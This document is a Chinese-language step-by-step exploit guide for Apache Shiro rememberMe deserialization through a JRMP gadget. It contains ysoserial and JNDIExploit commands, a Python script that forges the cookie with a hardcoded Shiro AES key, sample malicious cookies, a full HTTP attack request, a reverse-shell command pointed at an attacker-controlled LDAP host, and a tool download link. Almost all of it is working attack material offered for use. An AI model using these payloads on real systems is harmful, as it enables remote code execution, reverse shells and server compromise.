## shiro JRMP gadget

第一步：

```
java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar  ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 "ldap://ip:1389/Basic/Command/Whoami"
```

第二步:

```
 java -jar JNDIExploit-1.0-SNAPSHOT.jar -i ip
```



第三步：**修改13行key和21的主机ip和端口是第一步的主机ip和端口**

```
import sys # http11InputBuffer
import uuid
import base64
import subprocess
from Crypto.Cipher import AES


def encode_rememberme(command):

    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-1.8.3.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("4AvVhmFLUs0KTA3Kprsdag==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme("ip:8088")
    print("rememberMe={0}".format(payload.decode()))
```



第四步：**运行修改后第三步脚本**得到生成的cookie发包(某些环境可能使用burp存在问题，最好写个脚本之类的发包。)

```
rememberMe=vmWUdu7/R4y70YB6bHhacqcGLMLYDq4Pf6negfP9CyEJcp1ImtJv+1veBvuS7WxB5i/P9KRe+5qjdI2SAKWDM5LKY/0OrFP37NecjUbYUubeuN293QTNdEm1fKXWIDelGzB45ZxN6HYhLrwx8CJXBH6pHaqxvpofXWNYbnRgjfSrSqo7VIsQLngzrzm7iN62c6iqT7D6oWtQH6vFncEuCVT2o9UJCrRohpswDozdVRcoqObBI6USbSjToSj9g5Z+SzLOkWh4sqAp9DHeZ9OJho9k2grCTofPoOCxIeZ8fU68VjO8AoM7eIcu3l1pNH6wOfbtup+WfmeUv2+Cwyn4l850U9fFLRLLFmnNoILSk38tBk7h7q3hl8Cf+xKrIo21OhuyzR8GqZBEtbYT8sgloA==
```

![image-20211208130452912](https://gitee.com/samny/images/raw/master/summersec//0u05er0ec/0u05er0ec.png)



```
GET /sip2/login HTTP/1.1
Content-Type: text/xml
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Cookie: rememberMe=M3GVUEJCRvGoNdd4QIMLF2K5k9OkALM4FUCAX7VIf8CoDzjvfhGGkiqDefOBvAF21SoZ38kS+/hvBoVzG8Ub++/6uNhNCFlb4sbGnjdiu4DIHcyPas5d9LLnAzrWbWPY0OO1ATuoH2i+DQddFjWJu9ToQwfDCgS+oJquqDguZsTOp5iRn5dB72+c73S1COuu5cjmmlfhPuADPq6v2NFVdHmOCipC1mj8Z8MNjIXZ+JpXi1TP4cEKufXVNE9mzDyxnzGCWr5Qo7taMQua+MpTHEPpUseASlACWHy0IxY1g5ZvI9/Kw2UY9kXdhlQM0dN4Q1O4neoSMvk/N/Muir8KeyH1FrCj+xhSxj9xSGzIOt5m5e8zjDxf7tMXWhRaPOXj7ckP4/ieI82OteoVrSQIVQ==
Host: ip


```



反弹shell：

```
java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar  ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 "ldap://{ip}:{port}/Basic/ReverseShell/{ip}/{port}"
```







## 工具下载地址：

[shiro-JRMP_gadget](https://github.com/SummerSec/BlogParpers/releases/download/shiro/shiro-JRMP_gadget.zip)

